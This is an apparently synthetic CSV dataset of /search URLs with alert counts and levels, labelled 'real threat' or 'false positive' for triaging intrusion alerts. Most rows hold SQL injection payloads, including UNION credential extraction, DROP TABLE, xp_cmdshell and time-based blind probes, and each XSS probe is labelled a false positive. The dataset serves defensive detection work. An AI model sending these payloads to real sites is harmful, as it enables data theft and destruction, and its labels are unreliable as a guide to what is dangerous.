_source.data.url,_source.rule.firedtimes,_source.rule.level,label
/search?q=<script>alert(1)</script>,1,8,false positive
/search?q='abc',1,6,false positive
/search?q=',2,7,false positive
/search?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--,8,16,real threat
/search?q=' AND 1=(SELECT COUNT(*) FROM users)--,14,13,real threat
/search?q=' OR '1'='1,10,16,real threat
/search?q=' OR 1=1/*,13,14,real threat
/search?q=' OR SLEEP(5)--,14,6,real threat
/search?q=' OR 1=1; --,4,12,real threat
/search?q=' OR 1=1#,9,13,real threat
/search?q='; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END--,10,11,real threat
/search?q=1',2,5,false positive
"/search?q=' UNION ALL SELECT 1,2,3,4--",10,13,real threat
/search?q=%27+AND+ASCII%28SUBSTRING%28%40%40version%2C1%2C1%29%29%3E52--,9,14,real threat
/search?q=' OR 'x'='x'--,9,6,real threat
/search?q='DROP',1,7,false positive
/search?q=' OR 1=1/*,2,20,real threat
"/search?q=""test""",1,7,false positive
/search?q=' OR pg_sleep(5)--,15,15,real threat
/search?q='abc',3,8,false positive
/search?q='; DROP TABLE users--,9,15,real threat
/search?q=' OR ''=',11,13,real threat
/search?q='; EXEC xp_cmdshell('dir')--,5,6,real threat
/search?q=%27+AND+1%3D2--,6,10,real threat
/search?q=admin,2,6,false positive
/search?q=%27+OR+1%3D1--,8,6,real threat
/search?q=' OR '1'='1,14,16,real threat
/search?q=admin,1,5,false positive
/search?q='abc',1,5,false positive
/search?q=%3Ctest%3E,4,5,false positive
/search?q=%27+AND+1%3D2--,6,10,real threat
/search?q=' OR pg_sleep(5)--,3,6,real threat
/search?q=' OR 'x'='x'#,11,13,real threat
/search?q='=',3,8,false positive
/search?q='',3,5,false positive
/search?q=1',2,8,false positive
/search?q='DROP',3,5,false positive
/search?q=',3,6,false positive
/search?q=' OR 'x'='x'#,4,16,real threat
/search?q='=',3,8,false positive
/search?q=' OR 'x'='x'#,7,6,real threat
/search?q='; EXEC xp_cmdshell('dir')--,7,20,real threat
/search?q=%27%3B+SELECT+%2A+FROM+admin--,2,20,real threat
/search?q=' OR 1=1; --,1,14,real threat
/search?q='OR',5,7,false positive
/search?q='',4,6,false positive
/search?q=' AND 1=2--,10,20,real threat
/search?q='abc',3,7,false positive
/search?q=1',2,6,false positive
/search?q='abc',4,6,false positive
/search?q=%3Ctest%3E,4,6,false positive
/search?q=',4,8,false positive
/search?q=%27+UNION+SELECT+null--,4,11,real threat
/search?q='abc',1,8,false positive
/search?q=' OR 1=1#,6,16,real threat
/search?q='DROP',5,8,false positive
/search?q='; DROP TABLE users--,3,6,real threat
"/search?q=' UNION ALL SELECT 1,2,3,4--",1,10,real threat
/search?q='DROP',2,8,false positive
/search?q=<script>alert(1)</script>,4,5,false positive
/search?q=%3Ctest%3E,2,8,false positive
/search?q='',5,6,false positive
/search?q=' OR 1=1;#,15,16,real threat
/search?q=' OR 1=1 -- -,8,6,real threat
"/search?q=' UNION SELECT username, password FROM users--",10,16,real threat
"/search?q=' AND SUBSTRING(@@version, 1, 1) = '5'--",14,13,real threat
/search?q=<script>alert(1)</script>,2,7,false positive
/search?q=' OR 1=1;#,9,20,real threat
/search?q=' OR 1=1 -- -,4,12,real threat
/search?q=%27--,9,6,real threat
/search?q='abc',1,8,false positive
/search?q='=',1,5,false positive
/search?q=' OR 'x'='x'--,4,12,real threat
/search?q=%27+OR+%271%27%3D%271,14,12,real threat
/search?q=%3Ctest%3E,3,8,false positive
/search?q=%27+OR+1%3D1--,14,20,real threat
"/search?q=""test""",3,6,false positive
/search?q=' OR 1=1/*,14,16,real threat
/search?q=%27--,13,12,real threat
/search?q='OR',3,8,false positive
/search?q=' OR 1=1 -- -,5,11,real threat
/search?q=%27+AND+1%3D2--,12,20,real threat
/search?q='DROP',5,7,false positive
/search?q=' OR 1=1;#,13,13,real threat
/search?q=admin,4,7,false positive
"/search?q=""test""",2,5,false positive
/search?q=' OR '1'='1,4,12,real threat
/search?q=' OR pg_sleep(5)--,2,15,real threat
/search?q=%27--,13,12,real threat
/search?q=%27+AND+ASCII%28SUBSTRING%28%40%40version%2C1%2C1%29%29%3E52--,12,13,real threat
/search?q='%',1,5,false positive
/search?q='=',2,5,false positive
/search?q=admin,1,8,false positive
"/search?q=""test""",5,7,false positive
/search?q='=',1,8,false positive
/search?q='OR',2,6,false positive
/search?q=' AND 1=(SELECT COUNT(*) FROM users)--,15,10,real threat
/search?q=',3,8,false positive
/search?q=%27+OR+%271%27%3D%271,12,10,real threat
/search?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--,1,13,real threat
/search?q='; SELECT * FROM admin--,13,13,real threat
"/search?q=' UNION ALL SELECT 1,2,3,4--",13,13,real threat
"/search?q=' UNION SELECT username, password FROM users--",10,10,real threat
/search?q=' OR 1=1--,1,20,real threat
/search?q=%27--,15,13,real threat
/search?q=1',3,5,false positive
/search?q=' OR ''=',10,12,real threat
/search?q='=',3,8,false positive
/search?q=',4,7,false positive
/search?q='=',5,7,false positive
/search?q=admin,3,8,false positive
/search?q=' OR '1'='1,14,10,real threat
/search?q=' OR 1=1;#,14,10,real threat
/search?q=%27--,8,12,real threat
/search?q=' OR 1=1#,11,11,real threat
/search?q='; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END--,3,13,real threat
/search?q='DROP',1,7,false positive
/search?q=' OR 1=1; --,6,14,real threat
/search?q='OR',1,5,false positive
/search?q=' AND 1=2--,15,13,real threat
/search?q=',2,5,false positive
/search?q='%',5,7,false positive
/search?q=1',5,6,false positive
/search?q=' OR 1=1/*,10,11,real threat
/search?q='=',3,5,false positive
"/search?q=' UNION SELECT username, password FROM users--",9,10,real threat
/search?q=' UNION SELECT null--,2,20,real threat
/search?q=' UNION SELECT null--,15,20,real threat
/search?q='DROP',1,7,false positive
/search?q='=',1,5,false positive
/search?q='; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END--,2,6,real threat
/search?q=%27+AND+1%3D2--,6,14,real threat
/search?q='=',1,7,false positive
/search?q=1',3,8,false positive
/search?q='abc',4,7,false positive
/search?q=' AND 1=2--,14,15,real threat
"/search?q=' AND ASCII(SUBSTRING(@@version, 1, 1)) > 52--",11,13,real threat
/search?q=' OR 1=1;#,7,20,real threat
/search?q=' OR SLEEP(5)--,9,12,real threat
/search?q=' OR 1=1 -- -,2,13,real threat
/search?q='',3,8,false positive
/search?q='',4,7,false positive
/search?q=' OR (SELECT COUNT(*) FROM information_schema.tables)>0--,4,6,real threat
/search?q=' OR 1=1/*,14,15,real threat
/search?q=' UNION SELECT null--,8,20,real threat
/search?q='DROP',2,7,false positive
/search?q=<script>alert(1)</script>,3,7,false positive
/search?q=' OR 'x'='x'--,10,13,real threat
/search?q=%27--,12,15,real threat
/search?q='=',2,6,false positive
/search?q=' AND 1=2--,2,11,real threat
/search?q=' AND '1'='2,4,15,real threat
/search?q='OR',5,5,false positive
/search?q=',4,7,false positive
/search?q='=',4,7,false positive
/search?q=' AND 1=1--,8,20,real threat
/search?q='; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END--,10,11,real threat
/search?q=' AND 1=1--,3,11,real threat
/search?q=',4,6,false positive
/search?q=%3Ctest%3E,2,5,false positive
/search?q=' OR 1=1 LIMIT 1--,11,14,real threat
/search?q=admin,4,7,false positive
/search?q=%3Ctest%3E,1,6,false positive
/search?q=%3Ctest%3E,4,8,false positive
/search?q='; EXEC xp_cmdshell('dir')--,14,15,real threat
/search?q=%27--,6,10,real threat
/search?q=admin,4,6,false positive
/search?q=',2,5,false positive
/search?q=' OR 1=1; --,13,13,real threat
/search?q=',4,8,false positive
/search?q='; WAITFOR DELAY '0:0:5'--,13,10,real threat
/search?q='abc',1,8,false positive
/search?q='=',1,7,false positive
/search?q=%27%3B+EXEC+xp_cmdshell%28%27dir%27%29--,1,16,real threat
/search?q='OR',4,7,false positive
/search?q=' OR 1=1 -- -,7,11,real threat
/search?q=' OR pg_sleep(5)--,2,10,real threat
/search?q=' OR (SELECT COUNT(*) FROM information_schema.tables)>0--,14,20,real threat
/search?q='; DROP TABLE users--,5,6,real threat
"/search?q=' AND ASCII(SUBSTRING(@@version, 1, 1)) > 52--",1,6,real threat
/search?q='abc',3,8,false positive
/search?q=' UNION SELECT null--,8,16,real threat
/search?q='; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END--,13,15,real threat
/search?q=' OR EXISTS(SELECT * FROM users)--,11,12,real threat
/search?q='%',2,7,false positive
/search?q=' AND 1=1--,10,13,real threat
/search?q='%',1,6,false positive
/search?q=1',3,5,false positive
/search?q=',2,8,false positive
/search?q=' OR 1=1; --,13,14,real threat
/search?q='',3,5,false positive
"/search?q=""test""",3,5,false positive
/search?q=' AND '1'='2,10,6,real threat
/search?q=' OR EXISTS(SELECT * FROM users)--,9,16,real threat
/search?q=' OR 1=1; --,2,6,real threat
/search?q='=',1,5,false positive
/search?q='OR',4,6,false positive
/search?q=%3Ctest%3E,5,8,false positive
/search?q=<script>alert(1)</script>,2,5,false positive
/search?q=' OR 'x'='x'--,9,20,real threat
/search?q=' OR EXISTS(SELECT * FROM users)--,11,16,real threat
/search?q='',5,6,false positive
/search?q=%27+OR+1%3D1--,3,14,real threat
/search?q=' OR 'x'='x'--,8,10,real threat
/search?q=%27%3B+DROP+TABLE+users--,15,10,real threat
/search?q=%27+AND+ASCII%28SUBSTRING%28%40%40version%2C1%2C1%29%29%3E52--,6,6,real threat
/search?q=' AND 1=1--,14,6,real threat
/search?q=',4,7,false positive
/search?q='; SELECT * FROM admin--,5,10,real threat
/search?q=' UNION SELECT null--,4,15,real threat
/search?q='OR',2,5,false positive
/search?q=%27--,13,15,real threat
"/search?q=""test""",3,8,false positive
/search?q=' UNION SELECT null--,11,10,real threat
/search?q=' OR 1=1/*,11,14,real threat
/search?q=' OR 1=1--,1,15,real threat
/search?q=<script>alert(1)</script>,1,7,false positive
/search?q=' OR ''=',6,20,real threat
/search?q='OR',5,8,false positive
/search?q=admin,1,8,false positive
/search?q=%27%3B+EXEC+xp_cmdshell%28%27dir%27%29--,12,10,real threat
/search?q=1',5,5,false positive
"/search?q=' UNION SELECT username, password FROM users--",8,11,real threat
/search?q=',1,5,false positive
/search?q=',1,6,false positive
/search?q='; DROP TABLE users--,2,14,real threat
/search?q='',2,5,false positive
/search?q='%',5,7,false positive
/search?q=' OR '1'='1,7,6,real threat
/search?q='=',3,6,false positive
/search?q=' OR EXISTS(SELECT * FROM users)--,14,13,real threat
/search?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--,15,12,real threat
/search?q=' OR 1=1;#,4,16,real threat
/search?q=' OR 'a'='a,5,6,real threat
/search?q=%27%3B+EXEC+xp_cmdshell%28%27dir%27%29--,13,6,real threat
/search?q=%27+AND+ASCII%28SUBSTRING%28%40%40version%2C1%2C1%29%29%3E52--,1,16,real threat
/search?q=' OR 1=1 -- -,13,13,real threat
/search?q=' OR 1=1#,2,15,real threat
/search?q=' OR 1=1#,9,16,real threat
/search?q=' AND 1=(SELECT COUNT(*) FROM users)--,12,12,real threat
/search?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--,14,12,real threat
/search?q=',1,8,false positive
/search?q=%27+AND+1%3D2--,1,20,real threat
"/search?q=' AND SUBSTRING(@@version, 1, 1) = '5'--",9,6,real threat
/search?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--,8,6,real threat
/search?q=' OR 1=1#,9,6,real threat
/search?q='; EXEC xp_cmdshell('dir')--,6,12,real threat
/search?q='=',2,7,false positive
/search?q=%27+UNION+SELECT+null--,10,12,real threat
/search?q=' OR 'x'='x'#,14,10,real threat
"/search?q=""test""",2,7,false positive
/search?q=' AND 1=(SELECT COUNT(*) FROM users)--,7,11,real threat
/search?q=' OR 1=1 LIMIT 1--,6,20,real threat
/search?q='DROP',3,7,false positive
/search?q='OR',1,7,false positive
/search?q=%3Ctest%3E,3,6,false positive
/search?q=admin,1,8,false positive
/search?q='; SELECT * FROM admin--,5,14,real threat
/search?q=' AND '1'='2,2,15,real threat
/search?q=' OR 1=1--,14,14,real threat
/search?q=' OR ''=',7,12,real threat
/search?q=%27%3B+DROP+TABLE+users--,4,6,real threat
/search?q='=',2,5,false positive
/search?q=',5,8,false positive
/search?q=' OR EXISTS(SELECT * FROM users)--,11,13,real threat
/search?q='DROP',3,5,false positive
/search?q='=',3,7,false positive
/search?q=%27+OR+1%3D1--,5,20,real threat
/search?q=%27%3B+DROP+TABLE+users--,1,16,real threat
/search?q=' OR 1=1/*,15,14,real threat
/search?q=1',4,8,false positive
/search?q=' OR 'x'='x'--,15,6,real threat
/search?q='OR',3,7,false positive
/search?q='%',3,7,false positive
/search?q=' OR 1=1;#,6,11,real threat
/search?q=%3Ctest%3E,2,8,false positive
/search?q=',3,5,false positive
/search?q=' OR 'x'='x'--,10,13,real threat
/search?q=' AND 1=2--,10,12,real threat
"/search?q=' AND SUBSTRING(@@version, 1, 1) = '5'--",12,12,real threat
/search?q='=',2,6,false positive
"/search?q=""test""",1,5,false positive
/search?q='%',1,7,false positive
/search?q=' OR 1=1/*,13,6,real threat
/search?q='DROP',1,8,false positive
/search?q=<script>alert(1)</script>,3,5,false positive
"/search?q=""test""",4,8,false positive
/search?q='; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END--,15,15,real threat
/search?q='abc',3,8,false positive
/search?q=' OR SLEEP(5)--,2,10,real threat
/search?q='abc',2,8,false positive
/search?q=%27%3B+DROP+TABLE+users--,5,13,real threat
/search?q=%27+OR+1%3D1--,5,6,real threat
/search?q='; SELECT * FROM admin--,1,20,real threat
/search?q='%',2,7,false positive
/search?q=' OR 1=1/*,2,11,real threat
/search?q=%27+AND+ASCII%28SUBSTRING%28%40%40version%2C1%2C1%29%29%3E52--,5,15,real threat
/search?q=' AND 1=1--,7,12,real threat
"/search?q=' AND ASCII(SUBSTRING(@@version, 1, 1)) > 52--",5,13,real threat
/search?q=%27%3B+SELECT+%2A+FROM+admin--,12,20,real threat
/search?q=%3Ctest%3E,4,6,false positive
/search?q=' AND 1=2--,6,6,real threat
/search?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--,10,20,real threat
/search?q='=',4,6,false positive
/search?q=%3Ctest%3E,3,5,false positive
/search?q=' OR pg_sleep(5)--,3,14,real threat
/search?q=' OR 1=1/*,9,12,real threat
/search?q='abc',2,6,false positive
/search?q=%27+UNION+SELECT+null--,6,6,real threat
/search?q=%3Ctest%3E,3,5,false positive
/search?q='; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END--,7,14,real threat
/search?q='; DROP TABLE users--,9,6,real threat
/search?q=%27+AND+ASCII%28SUBSTRING%28%40%40version%2C1%2C1%29%29%3E52--,6,13,real threat
/search?q=%27%3B+SELECT+%2A+FROM+admin--,10,12,real threat
/search?q='abc',3,6,false positive
/search?q=%3Ctest%3E,5,8,false positive
/search?q=<script>alert(1)</script>,3,7,false positive
/search?q=',4,5,false positive
/search?q=' OR 'x'='x'--,4,20,real threat
/search?q=' OR '1'='1,3,10,real threat
/search?q=' AND 1=(SELECT COUNT(*) FROM users)--,3,14,real threat
/search?q=1',3,5,false positive
/search?q=' OR '1'='1,14,14,real threat
/search?q=1',2,5,false positive
/search?q=' OR SLEEP(5)--,15,13,real threat
/search?q='; EXEC xp_cmdshell('dir')--,13,13,real threat
/search?q='',5,7,false positive
/search?q=' OR ''=',9,16,real threat
/search?q=' AND 1=2--,8,20,real threat
/search?q=' OR 1=1--,6,12,real threat
"/search?q=""test""",1,8,false positive
/search?q=%27%3B+EXEC+xp_cmdshell%28%27dir%27%29--,12,20,real threat
/search?q='%',4,5,false positive
/search?q=1',2,5,false positive
/search?q=%27%3B+EXEC+xp_cmdshell%28%27dir%27%29--,7,11,real threat
/search?q=1',4,6,false positive
"/search?q=' UNION ALL SELECT 1,2,3,4--",2,13,real threat
/search?q='abc',1,6,false positive
/search?q=admin,2,8,false positive
/search?q=%3Ctest%3E,3,6,false positive
/search?q=' OR 1=1/*,8,14,real threat
/search?q=%27%3B+DROP+TABLE+users--,15,20,real threat
/search?q=' OR 1=1 LIMIT 1--,4,16,real threat
/search?q=admin,4,7,false positive
/search?q='',1,8,false positive
/search?q=' OR (SELECT COUNT(*) FROM information_schema.tables)>0--,12,12,real threat
/search?q=%27+UNION+SELECT+null--,11,15,real threat
/search?q=%27+AND+ASCII%28SUBSTRING%28%40%40version%2C1%2C1%29%29%3E52--,9,20,real threat
/search?q='; WAITFOR DELAY '0:0:5'--,15,15,real threat
/search?q=%27%3B+DROP+TABLE+users--,11,14,real threat
/search?q=' OR 1=1--,5,10,real threat
"/search?q=' UNION ALL SELECT 1,2,3,4--",4,12,real threat
/search?q=%3Ctest%3E,5,7,false positive
/search?q='=',4,7,false positive
/search?q=%3Ctest%3E,5,8,false positive
/search?q=' OR ''=',1,15,real threat
/search?q=' OR (SELECT COUNT(*) FROM information_schema.tables)>0--,11,11,real threat
/search?q=admin,2,8,false positive
/search?q=admin,3,5,false positive
/search?q=' OR 'x'='x'--,2,20,real threat
/search?q=' UNION SELECT null--,12,20,real threat
/search?q=',1,5,false positive
/search?q=%27+UNION+SELECT+null--,5,14,real threat
/search?q=' OR SLEEP(5)--,10,13,real threat
/search?q=' OR 1=1;#,14,15,real threat
/search?q='OR',5,7,false positive
/search?q=%3Ctest%3E,4,5,false positive
/search?q=1',2,7,false positive
/search?q=' OR 'x'='x'#,12,20,real threat
"/search?q=' UNION ALL SELECT 1,2,3,4--",13,16,real threat
/search?q='; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END--,8,12,real threat
/search?q='',1,5,false positive
/search?q='',3,5,false positive
/search?q=' OR 'a'='a,6,14,real threat
/search?q='%',4,8,false positive
/search?q=%3Ctest%3E,3,5,false positive
/search?q='',2,6,false positive
/search?q='; SELECT * FROM admin--,13,13,real threat
/search?q='%',4,6,false positive
"/search?q=' AND SUBSTRING(@@version, 1, 1) = '5'--",10,13,real threat
/search?q=1',1,5,false positive
"/search?q=' AND ASCII(SUBSTRING(@@version, 1, 1)) > 52--",2,20,real threat
/search?q=%27+AND+1%3D2--,6,6,real threat
/search?q=' OR 'a'='a,2,10,real threat
/search?q=admin,1,6,false positive
/search?q=' OR 1=1; --,2,15,real threat
/search?q=',4,7,false positive
/search?q=',3,6,false positive
/search?q=' OR 1=1;#,15,14,real threat
/search?q=' OR pg_sleep(5)--,4,11,real threat
/search?q='',2,5,false positive
/search?q='%',5,5,false positive
/search?q=admin,1,7,false positive
/search?q=%27+AND+ASCII%28SUBSTRING%28%40%40version%2C1%2C1%29%29%3E52--,5,20,real threat
/search?q=',5,6,false positive
/search?q=' OR 1=1 LIMIT 1--,7,11,real threat
/search?q='DROP',3,7,false positive
/search?q=' AND 1=(SELECT COUNT(*) FROM users)--,15,13,real threat
/search?q=%27+OR+%271%27%3D%271,6,13,real threat
/search?q=' OR 1=1;#,7,14,real threat
/search?q='=',5,7,false positive
/search?q=admin,1,7,false positive
"/search?q=' AND ASCII(SUBSTRING(@@version, 1, 1)) > 52--",15,13,real threat
/search?q=',2,6,false positive
"/search?q=""test""",2,5,false positive
/search?q=%27+AND+ASCII%28SUBSTRING%28%40%40version%2C1%2C1%29%29%3E52--,2,16,real threat
/search?q='; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END--,4,6,real threat
/search?q=' OR (SELECT COUNT(*) FROM information_schema.tables)>0--,2,13,real threat
/search?q='abc',5,8,false positive
/search?q=%27+OR+1%3D1--,15,13,real threat
/search?q=1',2,5,false positive
/search?q=%27+OR+1%3D1--,6,6,real threat
/search?q='; SELECT * FROM admin--,10,11,real threat
/search?q='OR',4,6,false positive
/search?q='; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END--,3,14,real threat
"/search?q=' AND ASCII(SUBSTRING(@@version, 1, 1)) > 52--",6,13,real threat
/search?q='%',1,8,false positive
/search?q='; WAITFOR DELAY '0:0:5'--,3,6,real threat
/search?q=admin,2,5,false positive
/search?q=' AND 1=2--,9,20,real threat
/search?q=%27%3B+DROP+TABLE+users--,8,12,real threat
/search?q=%27+UNION+SELECT+null--,12,11,real threat
/search?q='; EXEC xp_cmdshell('dir')--,12,20,real threat
/search?q=%27+AND+ASCII%28SUBSTRING%28%40%40version%2C1%2C1%29%29%3E52--,6,20,real threat
"/search?q=' AND SUBSTRING(@@version, 1, 1) = '5'--",13,15,real threat
"/search?q=' AND SUBSTRING(@@version, 1, 1) = '5'--",11,6,real threat
/search?q=%3Ctest%3E,1,7,false positive
/search?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--,5,10,real threat
/search?q='',5,7,false positive
/search?q=' OR '1'='1,4,10,real threat
/search?q='OR',5,5,false positive
/search?q=' OR pg_sleep(5)--,11,14,real threat
/search?q=' OR 1=1;#,1,16,real threat
/search?q=admin,3,7,false positive
/search?q=' OR 'x'='x'#,11,14,real threat
/search?q=<script>alert(1)</script>,5,8,false positive
/search?q=' OR 1=1/*,8,14,real threat
/search?q='; DROP TABLE users--,4,14,real threat
/search?q=' OR pg_sleep(5)--,1,11,real threat
/search?q=1',2,7,false positive
/search?q=%27+UNION+SELECT+null--,6,11,real threat
/search?q=<script>alert(1)</script>,5,8,false positive
/search?q=%27+OR+%271%27%3D%271,1,11,real threat
/search?q='OR',3,6,false positive
/search?q=%27%3B+SELECT+%2A+FROM+admin--,10,15,real threat
/search?q=' OR EXISTS(SELECT * FROM users)--,12,20,real threat
/search?q=' OR ''=',12,12,real threat
/search?q=' OR 1=1#,14,10,real threat
/search?q=' OR (SELECT COUNT(*) FROM information_schema.tables)>0--,4,12,real threat
/search?q=admin,1,6,false positive
/search?q=%27+AND+1%3D2--,4,6,real threat
/search?q=' OR pg_sleep(5)--,12,13,real threat
/search?q=%27--,14,10,real threat
/search?q=',2,6,false positive
"/search?q=' UNION ALL SELECT 1,2,3,4--",9,16,real threat
/search?q='',3,6,false positive
"/search?q=' UNION ALL SELECT 1,2,3,4--",8,6,real threat
/search?q=' AND '1'='2,7,6,real threat
/search?q=<script>alert(1)</script>,4,6,false positive
/search?q=<script>alert(1)</script>,4,5,false positive
/search?q='; SELECT * FROM admin--,7,6,real threat
/search?q='abc',1,8,false positive
"/search?q=' UNION SELECT username, password FROM users--",15,15,real threat
/search?q=' OR 1=1--,15,13,real threat
/search?q='DROP',4,8,false positive
/search?q=',5,5,false positive
/search?q=' UNION SELECT null--,7,15,real threat
/search?q=' OR 'a'='a,6,13,real threat
/search?q=' OR pg_sleep(5)--,7,10,real threat
"/search?q=' UNION SELECT username, password FROM users--",11,15,real threat
/search?q='; EXEC xp_cmdshell('dir')--,9,6,real threat
"/search?q=' AND ASCII(SUBSTRING(@@version, 1, 1)) > 52--",7,16,real threat
/search?q=%27%3B+SELECT+%2A+FROM+admin--,3,6,real threat
"/search?q=' AND SUBSTRING(@@version, 1, 1) = '5'--",2,14,real threat
/search?q=' OR 1=1--,8,6,real threat
"/search?q=""test""",3,5,false positive
/search?q='',5,5,false positive
/search?q=<script>alert(1)</script>,1,5,false positive
/search?q=' OR EXISTS(SELECT * FROM users)--,12,14,real threat
/search?q=' OR SLEEP(5)--,4,10,real threat
/search?q=%27+OR+%271%27%3D%271,15,16,real threat
/search?q=' AND 1=1--,8,10,real threat
"/search?q=""test""",1,5,false positive
/search?q='%',1,7,false positive
/search?q=%3Ctest%3E,4,6,false positive
/search?q=admin,3,8,false positive
/search?q=' OR 1=1#,7,16,real threat
/search?q='=',1,7,false positive
/search?q=' OR (SELECT COUNT(*) FROM information_schema.tables)>0--,12,11,real threat
/search?q=' OR 1=1 LIMIT 1--,11,6,real threat
/search?q=' OR 'x'='x'--,4,12,real threat
/search?q=%27+OR+1%3D1--,7,12,real threat
/search?q='; DROP TABLE users--,3,14,real threat
/search?q=' AND 1=1--,13,12,real threat
/search?q='abc',5,5,false positive
/search?q='DROP',2,5,false positive
"/search?q=' UNION ALL SELECT 1,2,3,4--",11,14,real threat
/search?q=%27+UNION+SELECT+null--,7,10,real threat
/search?q=' OR 1=1#,6,6,real threat
/search?q='OR',2,6,false positive
/search?q=' AND 1=(SELECT COUNT(*) FROM users)--,3,10,real threat
/search?q=' AND 1=2--,4,20,real threat
/search?q=%27--,4,10,real threat
/search?q=%27%3B+SELECT+%2A+FROM+admin--,6,6,real threat
/search?q=' OR 'x'='x'--,11,13,real threat
/search?q='%',5,8,false positive
/search?q=' OR 'x'='x'--,2,10,real threat
/search?q=',2,8,false positive
/search?q='; SELECT * FROM admin--,7,16,real threat
"/search?q=""test""",4,8,false positive
/search?q='',1,6,false positive
/search?q=' AND 1=1--,5,14,real threat
/search?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--,5,11,real threat
/search?q='DROP',3,7,false positive
/search?q=' OR 1=1 -- -,7,20,real threat
/search?q='',3,8,false positive
/search?q=%27+AND+1%3D2--,9,10,real threat
"/search?q=' UNION ALL SELECT 1,2,3,4--",5,15,real threat
/search?q='; DROP TABLE users--,11,14,real threat
/search?q='%',4,8,false positive
"/search?q=""test""",4,8,false positive
/search?q=' OR 1=1/*,11,14,real threat
/search?q=' OR 1=1; --,14,12,real threat
/search?q=',4,5,false positive
"/search?q=""test""",3,5,false positive
/search?q=1',1,7,false positive
/search?q='=',2,6,false positive
/search?q=' OR ''=',2,14,real threat
/search?q=' OR ''=',9,12,real threat
/search?q=' OR SLEEP(5)--,10,15,real threat
/search?q='; SELECT * FROM admin--,1,16,real threat
/search?q=' OR 1=1--,9,13,real threat
/search?q=' OR 1=1; --,15,10,real threat
/search?q=<script>alert(1)</script>,1,5,false positive
/search?q=' OR 1=1/*,15,15,real threat
"/search?q=""test""",2,8,false positive
/search?q=',1,5,false positive
/search?q=' OR 'x'='x'--,2,13,real threat
/search?q=' OR '1'='1,4,12,real threat
/search?q=%3Ctest%3E,3,6,false positive
/search?q='',4,5,false positive
/search?q=' OR 1=1 LIMIT 1--,1,15,real threat
/search?q=' UNION SELECT null--,3,10,real threat
/search?q=' AND '1'='2,6,20,real threat
/search?q=1',2,8,false positive
/search?q=' OR '1'='1,11,20,real threat
/search?q=%27+UNION+SELECT+null--,14,10,real threat
/search?q='',4,5,false positive
/search?q='; EXEC xp_cmdshell('dir')--,3,13,real threat
/search?q=' AND 1=2--,6,16,real threat
/search?q=' AND 1=2--,14,20,real threat
/search?q=' OR 1=1; --,13,10,real threat
/search?q='',3,8,false positive
"/search?q=' UNION ALL SELECT 1,2,3,4--",2,11,real threat
"/search?q=' UNION ALL SELECT 1,2,3,4--",12,20,real threat
/search?q=',3,7,false positive
/search?q=%27+OR+%271%27%3D%271,9,6,real threat
"/search?q=' AND ASCII(SUBSTRING(@@version, 1, 1)) > 52--",14,14,real threat
/search?q=%27+OR+1%3D1--,11,12,real threat
/search?q='=',5,7,false positive
/search?q=%27+AND+1%3D2--,9,13,real threat
/search?q=' UNION SELECT null--,12,13,real threat
/search?q=',5,7,false positive
/search?q=' OR 'x'='x'--,7,6,real threat
/search?q=',4,6,false positive
/search?q=%3Ctest%3E,5,7,false positive
"/search?q=""test""",5,7,false positive
/search?q=1',5,7,false positive
/search?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--,8,20,real threat
/search?q=' OR 'x'='x'#,14,14,real threat
/search?q=' OR 'a'='a,3,10,real threat
"/search?q=' UNION SELECT username, password FROM users--",1,12,real threat
/search?q=' AND 1=(SELECT COUNT(*) FROM users)--,15,13,real threat
/search?q='=',3,6,false positive
/search?q=' OR (SELECT COUNT(*) FROM information_schema.tables)>0--,8,6,real threat
/search?q='abc',4,5,false positive
/search?q=' OR '1'='1,14,13,real threat
/search?q=%27%3B+DROP+TABLE+users--,14,12,real threat
